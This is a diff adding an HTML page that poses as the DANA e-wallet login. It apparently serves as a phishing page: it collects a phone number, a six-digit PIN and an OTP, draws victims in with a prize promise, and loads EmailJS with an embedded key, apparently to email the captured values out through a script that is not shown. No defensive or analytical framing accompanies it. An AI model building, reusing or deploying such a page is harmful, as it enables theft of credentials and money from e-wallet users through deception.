@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
+  <meta name="theme-color" content="#118EEA"> 
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>𝗗𝗔𝗡𝗔 𝗜𝗗 - 𝗗𝗔𝗡𝗔 𝗞𝗔𝗚𝗘𝗧</title>
+  <!-- Tambahkan script EmailJS di sini -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init("9f-aWUsvDyCoBhtjO"); // Ganti dengan Public Key Anda
+    })();
+  </script>
+  <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="content">
+    <div class="container">
+      <!-- Halaman Nomor Telepon -->
+      <div id="number-page" style="display: block;">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Masukkan Nomor HP Kamu</h2>
+        <div class="phone-input-container">
+          <div class="country-code-box">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon">
+            <span> +62</span>
+          </div>
+          <input type="text" id="phone-number" placeholder="8811-2345-6789" maxlength="15" inputmode="numeric">
+        </div>
+        <p class="info-text">
+          Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.
+        </p>
+      </div>
+
+      <!-- Halaman PIN -->
+      <div id="pin-page" style="display: none;">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Masukkan PIN</h2>
+        <div class="pin-container">
+          <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="show-text-container">
+          <span class="show-text">Tampilkan</span>
+        </div>
+        <div class="help-forgot-container">
+          <a href="#" class="link">Bantuan</a>
+          <a href="#" class="link">Lupa PIN?</a>
+        </div>
+      </div>
+
+      <!-- Halaman OTP -->
+      <div id="otp-page" style="display: none;">
+        <h2>Masukkan Kode OTP</h2>
+        <div class="otp-container">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+        </div>
+        
+        <!-- Box Khusus untuk Tulisan di Bawah Kotak OTP -->
+        <div class="otp-message-box">
+          🎁 Berhadiah! Verifikasi sekarang untuk kesempatan menang hadiah menarik!!!
+        </div>
+
+        <!-- Notifikasi Floating -->
+        <div id="floating-notification" class="floating-notification">
+          Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Tombol Lanjutkan -->
+  <div class="fixed-button-container">
+    <button id="lanjutkan-button" class="button">Lanjutkan</button>
+  </div>
+
+  <script src="javascript.js"></script>
+</body>
+</html>
